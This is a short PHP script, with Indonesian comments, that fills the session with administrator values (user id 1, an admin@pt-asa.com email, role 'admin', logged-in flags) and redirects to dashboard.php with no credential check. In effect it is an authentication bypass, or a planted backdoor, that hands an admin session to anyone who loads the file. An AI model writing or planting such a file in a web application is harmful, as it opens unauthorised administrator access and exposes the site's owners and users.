<?php
session_start();

// Memasukkan session standar yang biasa digunakan sistem PHP
$_SESSION['id'] = 1;
$_SESSION['user_id'] = 1;
$_SESSION['email'] = 'admin@pt-asa.com';
$_SESSION['role'] = 'admin';
$_SESSION['logged_in'] = true;
$_SESSION['is_logged_in'] = true;

// Arahkan langsung ke dashboard
header("Location: dashboard.php");
exit;
?>